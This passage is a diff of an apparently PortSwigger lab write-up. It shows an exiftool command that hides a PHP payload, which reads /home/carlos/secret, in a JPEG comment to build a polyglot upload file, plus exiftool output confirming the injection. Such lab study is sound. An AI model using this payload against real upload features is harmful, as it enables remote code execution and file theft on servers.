@@ -18,13 +18,34 @@ Command -
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 ````
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1335183d-abbc-44e2-b2e2-7f6edbd67edc)
-
-
+```bash
+shebu@ubuntu:~/Desktop/websec$ exiftool polyglot.php 
+ExifTool Version Number         : 12.44
+File Name                       : polyglot.php
+Directory                       : .
+File Size                       : 8.3 kB
+File Modification Date/Time     : 2023:07:30 15:10:32+05:30
+File Access Date/Time           : 2023:07:30 15:11:50+05:30
+File Inode Change Date/Time     : 2023:07:30 15:10:32+05:30
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
+Image Width                     : 189
+Image Height                    : 130
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 189x130
+Megapixels                      : 0.025
+```
 - `comment` -> tells exiftool to inject the payload in the comment part of EXIF-metadata of the image called `flower.jpg`. It can also be injected in other fields like `document name` by providing `-documentname=`
-
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/0c5ee0c2-4cc3-4fb5-84f1-ab4a8078f06d)
-
 
 ## Solution :
 
